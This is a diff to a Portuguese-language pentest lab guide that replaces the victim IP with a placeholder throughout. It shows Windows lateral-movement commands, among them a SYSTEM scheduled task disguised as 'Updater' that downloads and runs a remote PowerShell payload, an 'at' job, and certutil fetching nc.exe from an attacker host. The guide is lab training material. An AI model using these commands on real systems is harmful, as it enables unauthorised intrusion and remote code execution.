@@ -44,7 +44,7 @@ Se rodar isso fora de um lab → **não é pentest, é BO**.
 
 - **Atacante:** Windows 11 (PC ou VM)
 - **Vítima:** Windows 10/11 (VM)
-- **IP da vítima:** `192.168.56.101`
+- **IP da vítima:** `ip`
 - **Rede:** Interna (Host-Only ou NAT)
 - **Credenciais:** Usuário low-priv previamente obtido
 
@@ -94,7 +94,7 @@ netstat -ano | findstr "LISTENING"
 ### Shares visíveis
 
 ```cmd
-net view \\192.168.56.101
+net view \\ip
 ```
 
 ---
@@ -142,7 +142,7 @@ Get-WmiObject -Class Win32_ComputerSystem
 ```
 
 ```powershell
-Get-WmiObject -Class Win32_LogicalDisk -ComputerName 192.168.56.101
+Get-WmiObject -Class Win32_LogicalDisk -ComputerName ip
 ```
 
 ---
@@ -160,7 +160,7 @@ Enable-PSRemoting -Force
 Do atacante:
 
 ```powershell
-Enter-PSSession -ComputerName 192.168.56.101 -Credential (Get-Credential)
+Enter-PSSession -ComputerName ip -Credential (Get-Credential)
 ```
 
 ```powershell
@@ -170,13 +170,13 @@ whoami
 ### Execução remota via Scheduled Task
 
 ```cmd
-schtasks /create /S 192.168.56.101 /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1')" /SC once /ST 00:00 /F
+schtasks /create /S ip /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1')" /SC once /ST 00:00 /F
 ```
 
 ### Método legado
 
 ```cmd
-at \\192.168.56.101 07:30 "cmd /c whoami > C:\temp\owned.txt"
+at \\ip 07:30 "cmd /c whoami > C:\temp\owned.txt"
 ```
 
 ---
@@ -186,7 +186,7 @@ at \\192.168.56.101 07:30 "cmd /c whoami > C:\temp\owned.txt"
 ### certutil
 
 ```cmd
-certutil -urlfetch -f http://192.168.56.10/nc.exe C:\Windows\Temp\nc.exe
+certutil -urlfetch -f http://ip/nc.exe C:\Windows\Temp\nc.exe
 ```
 
 ### bitsadmin
